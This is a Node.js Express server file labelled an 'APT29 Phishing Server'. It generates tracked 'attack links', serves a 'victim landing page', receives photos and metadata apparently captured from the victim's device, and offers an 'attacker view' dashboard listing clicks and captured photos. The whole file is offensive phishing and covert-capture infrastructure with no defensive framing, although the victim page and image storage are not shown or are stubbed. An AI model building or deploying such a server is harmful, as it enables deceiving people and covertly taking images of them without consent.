const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const { v4: uuidv4 } = require('uuid');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.static('public'));

// Root route - redirect to dashboard
app.get('/', (req, res) => {
    res.redirect('/dashboard');
});
// In-memory storage (resets on restart - fine for demo)
const sessions = new Map();

// Generate new attack link
app.post('/api/generate', (req, res) => {
    const sessionId = uuidv4();
    const session = {
        id: sessionId,
        status: 'WAITING',
        created: new Date().toISOString(),
        clicks: 0,
        photos: [],
        metadata: {}
    };
    sessions.set(sessionId, session);
    
    // Generate the full link
    const link = `${req.protocol}://${req.get('host')}/v/${sessionId}`;
    res.json({ link, sessionId });
});

// Victim landing page
app.get('/v/:sessionId', (req, res) => {
    const sessionId = req.params.sessionId;
    if (!sessions.has(sessionId)) {
        return res.status(404).send('Session expired or invalid.');
    }
    
    const session = sessions.get(sessionId);
    session.status = 'ACTIVE';
    session.clicks += 1;
    
    // Send the HTML page (we'll create this next)
    res.sendFile(path.join(__dirname, 'public', 'victim.html'));
});

// Receive photo from victim
app.post('/api/photo', (req, res) => {
    const { sessionId, image, metadata } = req.body;
    
    if (!sessions.has(sessionId)) {
        return res.status(404).json({ error: 'Session not found' });
    }
    
    const session = sessions.get(sessionId);
    const photoId = uuidv4();
    
    // Store photo metadata
    session.photos.push({
        id: photoId,
        timestamp: new Date().toISOString(),
        metadata: metadata || {}
    });
    
    // Save image to Cloudinary or local (we'll handle this later)
    // For now, just acknowledge
    res.json({ success: true, photoId });
});

// Dashboard - attacker view
// Dashboard - attacker view (HTML page)
app.get('/dashboard', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

// API endpoint for dashboard data (used by the HTML page)
// Dashboard - serve HTML page
app.get('/dashboard', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

// API endpoint for dashboard data
app.get('/api/dashboard', (req, res) => {
    const sessionData = Array.from(sessions.entries()).map(([id, data]) => ({
        id: id.substring(0, 8) + '...',
        status: data.status,
        clicks: data.clicks,
        photos: data.photos.length,
        created: data.created
    }));
    
    res.json({ sessions: sessionData });
});    

// Start server
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 APT29 Phishing Server running on port ${PORT}`);
    console.log(`📊 Dashboard: http://localhost:${PORT}/dashboard`);
});
